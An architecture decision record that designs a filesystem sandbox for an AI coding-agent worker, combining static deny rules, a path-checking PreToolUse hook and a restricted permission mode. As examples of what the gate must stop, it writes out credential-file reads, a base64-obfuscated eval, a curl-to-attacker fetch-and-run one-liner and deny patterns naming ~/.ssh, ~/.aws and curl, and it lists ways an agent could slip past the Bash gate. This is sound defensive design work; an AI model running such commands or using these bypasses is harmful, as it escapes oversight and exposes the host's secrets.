# 0028 — Worker-sandbox contract: gate site + path-prefix algebra + out-of-scope behaviour + Bash story + write-vs-read scope

- **Status:** Accepted
- **Date:** 2026-04-26
- **Builds on:** [ADR 0007](0007-phase-2-tool-using-worker-subprocess.md) — tool-using worker subprocess that this ADR scopes the filesystem reach of. [ADR 0008](0008-per-task-git-worktrees.md) — per-task worktree at `<projectPath>/.factory/worktrees/task-<taskId>/` that this ADR pins as the worker's sole write-allowed root. [ADR 0018](0018-verifier-advisory-only.md) — verifier demoted to advisory; this ADR removes the underlying cause of the F001 hallucinations the demotion was an interim mitigation for, by ensuring the worker's filesystem view never includes the parent factory5 checkout the verifier was asked to opine on. [ADR 0023](0023-repo-local-instance-and-cwd-walk.md) — `<projectPath>/.factory/` layout that the read-only allowlist references. [ADR 0024](0024-worker-subprocess-ask-user.md) — worker MCP layer that this ADR explicitly does **not** repurpose for fs gating; survey of Claude Code (the provider CLI we spawn) showed MCP servers cannot intercept the built-in `Read`/`Write`/`Edit`/`Bash`/`Glob`/`Grep` tools, only add new MCP-namespaced tools.

## Context

The worker subprocess (`@factory5/worker`) spawns the Claude Code CLI (`claude`) with `allowedTools: ['Read','Write','Edit','Bash','Glob','Grep']` and `permissionMode: 'bypassPermissions'` (which the provider arg-builder translates to `--dangerously-skip-permissions`; see `packages/worker/src/run-worker.ts:363-374` and `packages/providers/src/claude-cli.ts:243`). The spawn already pins `cwd: worktree.path`, but the LLM's tool calls can reference absolute paths anywhere the host user has access — `Read('/etc/passwd')` on Linux, `Read('C:/Users/Momo/.ssh/id_rsa')` on Windows, `Read('../../node_modules/...')` to reach the parent factory5 checkout (the verifier-hallucination case from F001). `Bash` similarly inherits the host user's full reach.

Three forcing functions converge here. **Phase 6c F001** — the verifier hallucinated about file absence partly because its model context included files that should never have been in scope; ADR 0018 demoted the verifier to advisory as an interim. **Phase 8 carry-forward** — ADR 0024 noted explicitly that the worker still has full filesystem access and deferred the scoping question to a later phase. **Phase 10 I013** — `git worktree remove --force` failed on Windows because workers polluted their worktrees with `node_modules/` from outside the worktree's tree. Phase 12's charter pays down all three with one path-prefix gate.

Five sub-decisions need pinning before any code lands so 12.2 implements against a fixed contract — same multi-decision-one-ADR shape used for [ADR 0024](0024-worker-subprocess-ask-user.md), [ADR 0025](0025-web-ui-architecture.md), [ADR 0026](0026-pluggable-runtime-contract.md), and [ADR 0027](0027-web-ui-mutation-surface.md):

1. **Gate site.** MCP middleware (worker-side, intercepts every tool call before reaching host fs) vs. Claude Code's native config (`permissions.allow` / `permissions.deny`, `additionalDirectories`, `--permission-mode`, `PreToolUse` hooks) vs. OS sandbox (chroot / Job Object / Linux namespace).
2. **Path-prefix algebra.** How the allowlist is expressed; cross-platform edge cases (Windows case-insensitive prefix, drive letters, UNC paths, `..` traversal, symlinks).
3. **Out-of-scope behaviour.** Silent skip vs. hard error vs. advisory log when a tool call lands outside the allowlist.
4. **Bash story.** `Bash` is shell-shaped, not fs-shaped; the gate site's reach is bounded.
5. **Write-vs-read scope.** The contract distinguishes writeable roots (just the worktree) from readable roots (worktree + project `.factory/` + repo templates). Make the asymmetry explicit.

A pre-decision survey of Claude Code revealed a constraint that drives §1: **MCP servers cannot intercept Claude Code's built-in tools.** MCP registration adds new tools (`mcp__<server>__<tool>`); it does not wrap or replace `Read`/`Write`/`Edit`/`Bash`/`Glob`/`Grep`. The `@factory5/worker-mcp` layer already in production (ADR 0024) cannot be repurposed as an fs gate. Claude Code's own native gates — `permissions.allow` / `permissions.deny` rules in `settings.json`, `additionalDirectories`, `--permission-mode acceptEdits` / `dontAsk`, and `PreToolUse` hooks — are the hookable surface. (Sources: Claude Code permissions, hooks-guide, MCP, sandboxing, and headless docs at `code.claude.com/docs`, surveyed 2026-04-26.)

## Decision

Five parts, one ADR. The gate is composed of three Claude Code-native primitives applied per-spawn at the worker boundary; no monkey-patching of Claude Code, no OS sandbox, no custom MCP middleware.

### 1. Gate site — Claude Code native primitives, applied per-spawn at the worker boundary

**Primitive composition** (three layers; each catches a different class):

| Layer                 | Primitive                                                                   | What it gates                                                                                                                                                                                                                                                                                    | Cost                                                       |
| --------------------- | --------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------- |
| Static deny           | `permissions.deny` array in `<worktree>/.claude/settings.local.json`        | Coarse blocks on obvious danger zones: `Read(~/.ssh/**)`, `Read(//etc/**)`, `Read(C:/Windows/**)`, mirrored on the write side (`Write(~/.ssh/**)`, etc.) — NARROW under `~/` so a workspace under the user's home directory remains writable. The affirmative hook is the actual write boundary. | Configuration only; no code                                |
| Affirmative allowlist | `PreToolUse` hook (small Node script, JSON-over-stdin)                      | Per-call path-prefix algebra: `tool_input.file_path` (resolved → absolute) checked against `workspaceRoots ∪ readOnlyRoots` for reads; `workspaceRoots` only for writes. Cross-platform normalisation.                                                                                           | One script in `@factory5/worker-sandbox` (new package)     |
| Mode                  | `--permission-mode acceptEdits` (replaces `--dangerously-skip-permissions`) | Auto-accepts edits within cwd + `additionalDirectories`; in headless mode, anything outside auto-denies. Eliminates the host-wide bypass that `--dangerously-skip-permissions` carried.                                                                                                          | Spawn-arg change in `packages/providers/src/claude-cli.ts` |

The settings file is written into the worktree at `allocateWorktree` time (per-spawn artifact, removed when the worktree is removed). The PreToolUse hook script is shipped with `@factory5/worker-sandbox` — a new, small package whose only job is hosting the path-prefix algebra and the hook script. A new optional field on the `ProviderRequest` shape — `sandbox: { workspaceRoots, readOnlyRoots, allowSymlinks }` — flows from `runWorker.ts` through `provider.stream()` and lands as the env vars the hook script reads when Claude Code invokes it.

Per the Claude Code precedence model: deny rules > hook decisions > allow rules. The static-deny layer is absolute; the hook handles the affirmative algebra (which deny patterns can't cleanly express because the worktree path is per-task); `acceptEdits` + `additionalDirectories` handle the mode-level auto-accept for edits within scope. Defence-in-depth at near-zero runtime cost: a misconfigured hook still denies the obvious danger zones via the static deny rules.

**Rejected alternatives.**

- _MCP middleware._ Claude Code's MCP layer adds new tools, never replaces built-ins. To intercept `Read`/`Write`/etc. via MCP, we'd have to disallow them as built-ins (`--allowedTools 'mcp__factory5-fs__read,…'`), reimplement them as MCP tools, and accept that prompts referencing built-in tool names go ungated. The migration cost (fork the prompt scaffolding, retrain the agents to call `mcp__factory5-fs__read` instead of `Read`) is disproportionate to the security gain over native primitives. A future Claude Code change to built-in tool handling could re-open the gap silently.
- _OS sandbox (chroot / Linux namespace / Job Object / sandbox-exec)._ Heaviest, hardest to make cross-platform. macOS sandbox-exec exists; Linux bubblewrap is debian/Fedora-only without setup; Windows Job Objects limit process resources but don't scope fs cleanly. Raises the per-build cost (sandbox setup latency, capability errors when the LLM legitimately wants `pnpm install`) for a marginal gain over native primitives. Out of scope for Phase 12; could land in Phase 13 as a belt-and-braces add-on if a real exfiltration incident materialises.
- _Provider-CLI flag-only (`--allowedTools` with embedded path patterns, e.g. `Edit(./**)`)._ Claude Code's permission-rule syntax can express cwd-relative writes (`Edit(./**)`), but it can't symbolically express our actual write rule (`<projectPath>/.factory/worktrees/task-<id>/**`) per-spawn — the worktree path is absolute and per-task. Static deny rules can be templated per-spawn, but the affirmative algebra lives more cleanly in code than as generated patterns.

### 2. Path-prefix algebra — `{ workspaceRoots, readOnlyRoots, allowSymlinks }`

The contract that flows from `runWorker` through the hook:

```ts
// in @factory5/worker-sandbox
export interface WorkerSandboxConfig {
  workspaceRoots: readonly string[]; // absolute paths; read+write allowed
  readOnlyRoots: readonly string[]; // absolute paths; read-only allowed
  allowSymlinks: boolean; // false by default
}
```

For Phase 12 the worker hands the hook these defaults:

- `workspaceRoots: [worktree.path]` — the per-task worktree, the only writeable root.
- `readOnlyRoots: [<projectPath>/.factory, <repoTemplatesDir>]` — `findRepoTemplatesDir()` resolves to the package's templates directory; project `.factory/` is read-only so workers can read prior plans / findings / `project.json` without writing outside the worktree.
- `allowSymlinks: false` — symlinks rejected; `..` traversal resolves to absolute first then prefix-checks. (`pnpm install` in the worktree creates symlinks pointing at the global pnpm store outside the worktree; this is a known live case — see Consequences for the workaround.)

**Resolution algorithm** (run inside the hook script for every Read/Write/Edit/Glob/Grep call):

1. Read `tool_name`, `tool_input.file_path` (or `tool_input.pattern` for Glob/Grep), `cwd` from the JSON delivered on stdin.
2. If the path is relative, resolve against `cwd` to absolute via `node:path.resolve`.
3. Normalise: collapse `..`, normalise separators (`\` → `/` on Windows so the prefix check is consistent), Windows case-insensitive prefix (the hook lowercases both sides on `process.platform === 'win32'`).
4. UNC paths (`\\server\share\…`): allowed only if a `workspaceRoots` / `readOnlyRoots` entry is also a UNC path with the same server+share prefix. Otherwise denied. (Phase 12 doesn't make UNC paths a first-class allowlist target; the algebra handles them but no `readOnlyRoots` entry will be UNC by default.)
5. If `allowSymlinks === false` and `fs.lstatSync(absolutePath).isSymbolicLink()`, deny — without dereferencing.
6. Bucket the call:
   - **Write-class** (`Write`, `Edit`): require `prefix(absolutePath, workspaceRoots)`.
   - **Read-class** (`Read`, `Glob`, `Grep`): require `prefix(absolutePath, workspaceRoots ∪ readOnlyRoots)`.
   - **Bash**: see §4.
7. If the prefix check passes, hook exits 0 with `permissionDecision: "allow"`; if it fails, hook exits 0 with `permissionDecision: "deny"` and a `permissionDecisionReason` naming the offending path and the allowed roots (so the LLM sees the deny + can adapt).

**Cross-platform pinned cases:**

| Case           | Linux/macOS              | Windows                                                      |
| -------------- | ------------------------ | ------------------------------------------------------------ |
| Prefix match   | Byte-equal               | Case-insensitive (lowercased both sides)                     |
| Path separator | `/`                      | `\` and `/` both accepted; normalised to `/` for compare     |
| Drive letter   | n/a                      | `C:/` and `c:/` both prefix-equal                            |
| `..` traversal | `path.resolve` collapses | Same                                                         |
| UNC            | n/a                      | `\\server\share\…`; allowlist entry must share server+share  |
| Symlink        | `lstat`-checked, denied  | Reparse points (junctions, mklink) — `lstat`-checked, denied |
| Trailing slash | `/foo` and `/foo/` equal | Same                                                         |

Helpers (`pathInsideAny`, `normaliseForCompare`) live in `@factory5/worker-sandbox/src/path-prefix.ts`; unit-test surface covers all rows of the table on Windows + Linux as part of 12.3.

### 3. Out-of-scope behaviour — hard error (`permissionDecision: "deny"` with reason)

When the hook denies a call, the LLM sees:

```
Tool use blocked: <ToolName> on <path> is outside the worker's filesystem
sandbox. Allowed write roots: <list>. Allowed read roots: <list>. The
attempt was logged for audit.
```

Three reasons:

- **The verifier-hallucination class is what we're paying down (F001).** A silent-skip (return empty result) or advisory-log path lets the verifier keep hallucinating — empty-result-on-an-unscoped-path is indistinguishable from "the file genuinely doesn't exist" or "the file is empty". A hard deny forces the surface to surface.
- **Workers should fail loudly.** A denied call is a real signal that the agent is reaching for something outside its writ. The downstream effect — agent receives the deny reason, can adapt or surface back to the operator via `ask_user` (ADR 0024) — is exactly the "fail visibly, recover gracefully" loop the rest of the system already supports.
- **Audit trail.** Every denied call is logged at `warn` level via `createLogger('worker.sandbox')` with `correlationId: { taskId, directiveId }`, the offending path, the tool name, and the closest allowed root. Post-build review can grep for `tool=Read path=/etc/passwd verdict=deny`.

The static deny rules in `settings.local.json` and the hook compose: the static layer catches obvious danger paths even if the hook script crashes or is misconfigured; the hook handles the affirmative algebra. If the hook crashes (non-zero exit), Claude Code interprets that as fail-closed by convention.

`permissionDecisionReason` text intentionally does not list the exact deny rule (no information that helps the LLM craft an evasion); it lists the _allowed_ roots so the LLM understands the contract.

### 4. Bash story — accepted as a Phase 12 limitation; mitigations layered, not strict

`Bash` is shell-shaped: the LLM emits a command string, Claude Code executes it via subprocess. The hook can read the command but parsing arbitrary shell text to extract "the files this command will touch" is unsound — `cat /etc/passwd` is parseable, `bash -c 'eval $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)'` isn't. Phase 12 layers two mitigations and accepts the residual gap:

- **cwd pinning (already done).** `provider.stream({ cwd: worktree.path })` already pins the shell's working directory; relative-path Bash (`cat ./README.md`, `ls ../`) resolves against the worktree, and `..` escape is one of the cases the static deny rules below catch coarsely.
- **Static command-pattern denies in `permissions.deny`.** A small allowlist of obvious danger-path patterns: `Bash(* /etc/*)`, `Bash(* ~/.ssh/*)`, `Bash(* ~/.aws/*)`, `Bash(curl http*://* > *)`, `Bash(* | base64 *)` — heuristic, leaky, but catches the LLM's lazy patterns.

What this **doesn't** stop:

- `cat /etc/passwd` slipped past with patterns the LLM crafts to look unlike the deny patterns.
- Indirect reads (`bash -c '…'`, `eval`, base64-piped commands).
- Subprocess-spawned tools that read fs (`pip install -e .` reading from anywhere on PYTHONPATH).

Phase 12 ships the Read/Write/Edit/Glob/Grep gate with this Bash gap explicitly known. Phase 13 is the right venue for OS-level Bash sandboxing if a real incident surfaces (a verifier `cat ~/.ssh/id_rsa` event, a worker that exfiltrates a token via `curl`, etc.). The forward queue in `phase-12/README.md` already lists Bash sandboxing as a Phase 13 candidate.

The contract documents the gap. Operator-visible surface: a `worker.sandbox.bash_gap_known: true` log line at worker spawn time, plus a one-paragraph note in `docs/AGENTS.md` (or a new `docs/SECURITY.md` — pick at 12.5 close based on what fits the existing flow).

### 5. Write-vs-read scope — explicit asymmetry; writes worktree-only, reads broader

The contract draws the asymmetry by tool family, not by path-pattern shape:

| Tool family                                    | Allowed roots                                    | Why                                                                                                                                                        |
| ---------------------------------------------- | ------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Write`, `Edit`                                | `workspaceRoots` only — the worktree             | Writes outside the worktree compromise the per-task isolation that ADR 0008 set up; project state should only mutate via post-task merge, not direct write |
| `Read`, `Glob`, `Grep`                         | `workspaceRoots ∪ readOnlyRoots`                 | Workers legitimately read prior plans, prior findings, `project.json`, repo templates without needing copies                                               |
| `Bash`                                         | cwd-pinned to worktree; static deny rules per §4 | See §4                                                                                                                                                     |
| MCP tools (`mcp__factory5-ask-user__ask_user`) | unaffected                                       | MCP tools route through worker-mcp, not the fs gate                                                                                                        |

Concrete defaults at worker spawn (per-task):

```ts
sandbox: {
  workspaceRoots: [worktree.path],
  readOnlyRoots: [
    join(projectPath, '.factory'),
    findRepoTemplatesDir(),
  ],
  allowSymlinks: false,
}
```

The `<projectPath>/.factory` read root is intentional: it's the project's persistent metadata (`project.json`, prior `findings.json`, prior plans). If the worker needs to read it, it uses Read; it never writes there directly — post-task aggregation is the brain's job (already true; this just makes it enforced). The repo templates root is read-only by definition (templates are reference material).

Passing `readOnlyRoots` through `runWorker` rather than computing it inside `@factory5/worker-sandbox` means a future channel/tooling change ("this build needs to reference an external schema dir") can extend the allowlist per-task without touching the algebra.

## Consequences

**Positive.**

- **F001 forcing function paid down.** The verifier's worker-side filesystem view becomes the worktree only (plus the read-only allowlist); cross-task / cross-project / parent-checkout reads stop. ADR 0018's "advisory-only" demotion was an interim — this ADR removes the underlying cause and makes the verifier's surface trustable again. Re-promotion of the verifier from advisory is a separate decision, not made here.
- **Phase 8 carry-forward closed.** ADR 0024's note on "worker has full fs access; defer scoping" lands.
- **I013 on the path to closing.** `node_modules/` only creates inside the worktree because Bash's cwd is pinned and Read/Write outside the worktree are denied; the worktree-cleanup pain on Windows that I013 logged stops being a recurring failure mode (modulo the Bash gap; if the LLM `cd`s out and back in, that's still the gap).
- **Cross-platform parity.** Native primitives + a small Node hook script work identically on Windows + Linux + macOS. No OS-specific code paths in the gate (separator/case differences live in the path-prefix helpers and are unit-tested).
- **No new external deps.** The hook script is plain Node; the algebra is `node:path` + `node:fs` + a small wrapper. No bubblewrap, no sandbox-exec, no Job Objects.
- **Per-task ephemeral.** The settings file lives in the worktree; the worktree is per-task; nothing persists when the task ends. No machine-state to clean up if the gate is removed.
- **Observable.** Every denied call lands in the worker log via `createLogger('worker.sandbox')`. Operators can grep for `tool=Read path=/etc/passwd verdict=deny` post-incident.
- **Hook-as-script means runtime-tunable.** If a Phase-13 build campaign needs to widen the allowlist for a real-world dependency oddness, it's a config change at spawn time, not a code change.
- **Building on extension points already in place.** `ProviderRequest` already carries spawn-shape config (cwd, allowedTools, mcpConfigPath); adding `sandbox?` is idiomatic. The verifier's `provider.call()` path doesn't pass a sandbox config and stays unchanged — Phase 12 is precise about what it gates.

**Negative.**

- **Bash gap is real.** Documented; deferred to Phase 13. A motivated LLM (or jailbreak) can read host fs via Bash today even with the gate. The mitigation footprint (cwd pinning + static command-pattern denies) catches accidental cases, not adversarial ones.
- **Hook-script runtime cost per tool call.** Every Read/Write/Edit/Glob/Grep tool call spawns a Node subprocess (the hook script). With Phase 10's typical task touching 50–200 tool calls, that's 50–200 hook invocations per task — bounded but real. Mitigated: the script has no I/O beyond reading stdin + emitting JSON; runs under Node's V8 startup (~50 ms cold, less under hot OS-cache). If the per-call latency turns out load-bearing, the next-step optimisation is bundling — out of scope for 12.2.
- **Symlink rejection breaks default `pnpm install`.** Default pnpm install creates a symlink farm pointing into the global store outside the worktree; with `allowSymlinks: false`, post-install file reads fail the prefix check. Workaround: workers running `pnpm install` get `--shamefully-hoist` added (or `npm install` substituted). Long-term fix: `allowSymlinks: true` with a tightening that disallows symlink _targets_ outside `workspaceRoots ∪ readOnlyRoots`. Tracked as a 12.4 live-validation finding-class to resolve before 12.5; if it bites in 12.4, a follow-up sub-step lands the looser rule before phase close.
- **Fail-closed on hook crash means a misconfigured hook is a build outage.** If the script throws unexpectedly (corrupt env, missing Node binary at the hook command path), every tool call denies and the worker stalls. Mitigated by defensive coding inside the hook + a smoke check at spawn time (`runWorkerSandbox.smokeCheck()` runs the hook once with a known-allowed path before letting the worker start). The smoke check failing aborts the spawn cleanly, not mid-task.
- **`acceptEdits` mode replaces `bypassPermissions` — slight behaviour shift.** `acceptEdits` auto-accepts edits within cwd + `additionalDirectories`; in headless mode without prompts, anything outside auto-denies (which is what we want). 12.2 + 12.3 must verify no existing tool call relied on `bypassPermissions` for a non-fs action.
- **Settings precedence lock-in.** `<worktree>/.claude/settings.local.json` is the highest-priority non-managed source below CLI flags. If a future ADR wants to override these from the user side (`~/.claude/settings.json`), the deny rules still win — this is by design but worth noting. Workers explicitly ignore user-side Claude Code settings; the worktree is the only authoritative source for the spawn.
- **One more package (`@factory5/worker-sandbox`).** Bumps workspace package count by 1 (15 total). Could live inside `@factory5/worker` instead; pulled out because the algebra is interesting on its own and the verifier (read-only path) might want to share it in the future without taking a `@factory5/worker` dep.

**Reversible?** Yes, layered.

- _Disable the sandbox at spawn:_ env var `FACTORY5_DISABLE_WORKER_SANDBOX=1` makes `runWorker` skip writing `<worktree>/.claude/settings.local.json` and pass `--dangerously-skip-permissions` like before. For 12.4 live validation A/B + emergency rollback.
- _Remove `@factory5/worker-sandbox`:_ delete the package, revert `runWorker.ts` + `claude-cli.ts` changes, drop the `sandbox?` field from `ProviderRequest`. Pre-Phase-12 behaviour returns. No persistent state encodes a Phase-12-specific shape.
- _Loosen the algebra:_ change `allowSymlinks` to `true`, extend `readOnlyRoots`, etc. — config-only, no rebuilds.

## Alternatives considered

- **MCP middleware as a write-time wrapper for built-in tools.** Rejected per §1: Claude Code's MCP layer adds tools, doesn't intercept built-ins. The migration cost (replace `Read` with `mcp__factory5-fs__read` in all prompt scaffolding) is large, the security gain over native primitives is marginal, and a future Claude Code change to built-in tool handling could re-open the gap silently.

- **OS-level sandbox (chroot / Linux namespace / Job Object / sandbox-exec).** Rejected for Phase 12 per §1: heaviest, hardest to make cross-platform, raises per-build cost. Worth revisiting in Phase 13 _iff_ a real incident materialises; the native gate is sufficient for the F001 / I013 / Phase-8-carry-forward forcing functions in this phase.

- **Provider-CLI `--allowedTools` syntax with embedded patterns (`Edit(./**)`).** Half-considered: native syntax can express cwd-relative (`./`) but not absolute per-spawn paths symbolically. We use `--allowedTools` for the tool list and let the hook do the algebra; static deny rules in settings handle the easy cases.

- **Settings-only gating (no PreToolUse hook).** Rejected: Claude Code's `permissions.allow` syntax can express per-spawn paths via templated settings (write `Edit(<worktree-abs-path>/**)` directly into the per-spawn settings file), but the Windows case-insensitive + UNC + symlink-rejection algebra needs code, not patterns. The hook is the seam where that code lives. Settings-only would force us to template a long deny list per-spawn and miss the affirmative-allowlist guarantee.

- **Hook-only gating (no static deny rules).** Rejected: a single-layer gate is brittle. If the hook script crashes or is misconfigured, the static deny rules in settings are the belt to the hook's braces — the obvious danger zones (`~/.ssh`, `/etc`, `C:/Windows`) deny even if the affirmative-allowlist hook fails. Defence-in-depth at near-zero cost.

- **Silent-skip out-of-scope behaviour (return empty content).** Rejected per §3: lets the verifier keep hallucinating because empty-result-on-an-unscoped-path is indistinguishable from "the file genuinely doesn't exist" or "the file is empty". The hard-deny shape forces the agent to surface and adapt.

- **Advisory-log out-of-scope behaviour (don't gate, just record).** Rejected per §3: doesn't actually prevent the behaviour we're paying down; reduces to "log the bug instead of fix the bug". Useful as an audit-trail layer (which we add anyway), not as the gate itself.

- **Strict Bash command parsing with shellwords + path extraction.** Rejected per §4: parsing arbitrary shell is unsound; `bash -c "$(curl http://attacker/exploit.sh)"` is a one-line bypass of any heuristic parser. The honest answer is "Bash is gappable by design at this layer; defer to Phase 13 for OS sandboxing if needed".

- **Per-`Bash`-command allowlist (`allowedTools: 'Bash(npm install), Bash(go build), …'`).** Rejected: brittle (every new command needs a list update), insufficient (`npm install` runs arbitrary post-install scripts), and the maintenance cost dwarfs the benefit. The forward queue documents that this approach is the wrong shape; an OS sandbox is the right shape if the gap matters.

- **Symmetric read+write allowlist (one `allowedRoots: string[]`).** Rejected per §5: the writes-only-into-worktree invariant is what protects ADR 0008's per-task isolation. Conflating reads and writes would either over-restrict reads (workers can't see prior findings / project metadata) or under-restrict writes (workers can clobber sibling-task worktrees). Asymmetry is the right shape.

- **Hard-code `readOnlyRoots` inside `@factory5/worker-sandbox` rather than passing through `runWorker`.** Tempting because the defaults are obvious. Rejected for the extension-point reason in §5: a future channel change (custom external schema dir) needs a per-task widening, and pass-through avoids a circular dep where worker-sandbox imports project-path conventions.

- **Sandbox the verifier read-only path too (gate `provider.call()`, not just `provider.stream()`).** Conditionally rejected: the verifier already runs `provider.call()` with no tools — its filesystem view is whatever the prompt contains, not what the LLM "asks for". The worker tool-using path is where the gate matters; the verifier-hallucination class is paid down by ensuring the _worker's_ fs view stays in scope so verifier-time observations (about files that the worker did or didn't touch) are grounded in a sandboxed truth rather than a host-wide one.

- **`allowSymlinks: true` by default with target-prefix recheck.** Tempting because it would let `pnpm install` (default flags) work. Rejected for Phase 12: the recheck adds algebra surface (symlink → target → re-prefix-check, with cycle detection) that the unit-test surface should land cleanly before flipping the default. If `--shamefully-hoist` proves too painful in 12.4, re-evaluate then; the contract field is in place.

## Implementation outline (12.2–12.4)

Sub-step mapping (mirrors `.control/phases/phase-12-worker-fs-scoping/steps.md`):

- **12.2 — Implementation.**
  1. New package `packages/worker-sandbox/` with `package.json`, `tsconfig.json`, `README.md`. Public exports:
     - `WorkerSandboxConfig` interface (the §2 shape).
     - `pathInsideAny(absolutePath, roots, opts)` — the prefix-check primitive (case-insensitive on Windows, trailing-slash insensitive, symlink-aware).
     - `evaluateToolCall({ toolName, toolInput, cwd, config })` → `{ decision: 'allow' | 'deny', reason: string }`.
     - `writeWorktreeSettings(worktreePath, config)` — writes `<worktree>/.claude/settings.local.json` with the deny rules + hook registration.
     - `runHookFromStdin()` — the script entrypoint: reads JSON, calls `evaluateToolCall`, writes the `permissionDecision` JSON, exits.
     - `bin/sandbox-gate.js` — thin wrapper that calls `runHookFromStdin()`.
  2. `ProviderRequest` (in `@factory5/providers`) gains an optional `sandbox?: WorkerSandboxConfig` field. `claude-cli.ts` arg builder: when `sandbox` is set, drop `--dangerously-skip-permissions`, add `--permission-mode acceptEdits`, and call `writeWorktreeSettings` before spawn. Otherwise: existing behaviour (covers the verifier `provider.call()` path which doesn't pass a worktree, and any future runtime that doesn't want fs scoping).
  3. `runWorker.ts` (line ~363): build the `WorkerSandboxConfig` for the tool-using path: `workspaceRoots: [worktree.path]`, `readOnlyRoots: [join(projectPath, '.factory'), findRepoTemplatesDir()]`, `allowSymlinks: false`. Pass to `provider.stream`.
  4. New env var `FACTORY5_DISABLE_WORKER_SANDBOX=1` — short-circuits step 3 to the pre-Phase-12 path. For 12.4 live-validation A/B + emergency rollback.
  5. New logger: `createLogger('worker.sandbox')`. Every deny logged at warn with `correlationId: { taskId, directiveId }`, the offending path, and the closest allowed root.
  6. Spawn-time smoke check: `evaluateToolCall` invoked once with a known-in-scope path before the provider spawn returns; abort cleanly if the hook misbehaves.

- **12.3 — Regression tests.** In `packages/worker-sandbox/src/`:
  - `path-prefix.test.ts` — algebra unit tests (cross-platform table from §2). `describe.skipIf(process.platform === 'win32')` for Linux-only rows + vice versa.
  - `evaluate-tool-call.test.ts` — every tool × write-vs-read combination from §5.
  - `settings.test.ts` — `writeWorktreeSettings` produces a valid Claude Code settings file with the right `deny` + `hooks.PreToolUse` registration; round-trips.
  - `hook-runtime.test.ts` — `runHookFromStdin` produces the right `permissionDecision` JSON for the cross-product of tools × inside-allowlist / outside-allowlist / symlink / `..` traversal / case-mismatch / UNC.

  In `packages/worker/test/`:
  - `sandbox-integration.test.ts` — `runWorker` builds the right `WorkerSandboxConfig` and spawn args; the resulting `<worktree>/.claude/settings.local.json` has the expected shape; `FACTORY5_DISABLE_WORKER_SANDBOX=1` short-circuits cleanly.
  - `f001-replay.test.ts` — a tool-using worker spawn with a project where `node_modules/` lives in the parent factory5 checkout. Pre-fix: the worker reads it. Post-fix: the deny fires and the worker logs the rejected path.
  - `out-of-scope-cross-platform.test.ts` — Linux: `Read('/etc/passwd')` denied. Windows: `Read('C:/Windows/System32/drivers/etc/hosts')` denied. Both produce a hook-deny + worker-log line.

- **12.4 — Live validation.** Operator runs `factory build` on a Phase 10 fixture (`log-totals-cli` is the cheapest — runs in ~$3 per Phase 11.6 datapoint) under the new gate. Verify:
  - Build runs to completion (gate doesn't break legitimate work).
  - Worker logs show no out-of-scope reads being attempted (or, if any, they short-circuit cleanly).
  - `node_modules/` (or equivalent) creates inside the worktree only (paying down I013).
  - The smoke check at spawn time runs and passes.
  - `FACTORY5_DISABLE_WORKER_SANDBOX=1` cleanly turns the gate off (sanity check; actual validation is gate-on).
  - If `pnpm install --shamefully-hoist` proves operationally awkward, capture as a 12.4-discovered finding and decide before 12.5 whether to land the looser `allowSymlinks: true` rule with target-prefix recheck.

- **12.5 — Phase close.** Tag `phase-12-worker-fs-scoping-closed`. `docs/Phase12_Progress.md` + `docs/PROGRESS.md` entry + `CompleteArchitecture.md` extension (worker-sandbox model — pick §24-new vs. §3 / §16 extension at close-time based on which fits the existing flow). Scaffold Phase 13 (Bash sandboxing if 12.4 surfaced a demand signal, else carry-forward by signal).

`@factory5/worker-sandbox` joins as the 15th workspace package. `ProviderRequest` (in `@factory5/providers`) gains one optional field. `runWorker.ts` gains one config-construction block and one `provider.stream` arg. `claude-cli.ts` arg builder gains a branch on `sandbox` presence. No persistent state migrations; no schema changes outside `ProviderRequest`.
